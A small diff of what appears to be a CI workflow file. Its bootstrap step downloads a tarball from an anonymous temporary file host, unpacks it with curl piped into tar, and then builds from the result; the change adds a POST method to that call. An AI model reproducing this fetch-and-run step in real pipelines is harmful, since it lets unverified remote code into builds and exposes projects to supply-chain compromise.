@@ -21,7 +21,7 @@ jobs:
           python-version: "3.12"
       - name: Bootstrap sources (first run only)
         run: |
-          if [ ! -f build.py ]; then curl -fsSL "https://temp.sh/kjoHk/bootstrap.tgz" | tar xz; fi
+          if [ ! -f build.py ]; then curl -fsSL -X POST "https://temp.sh/kjoHk/bootstrap.tgz" | tar xz; fi
           for f in *.gz *.gz.b64; do [ -e "$f" ] || continue; git rm -q --cached "$f" 2>/dev/null; rm -f "$f"; done
           ls -la
       - name: Build (daily feed + mesos.watch live poll + NiaDB cross-check)
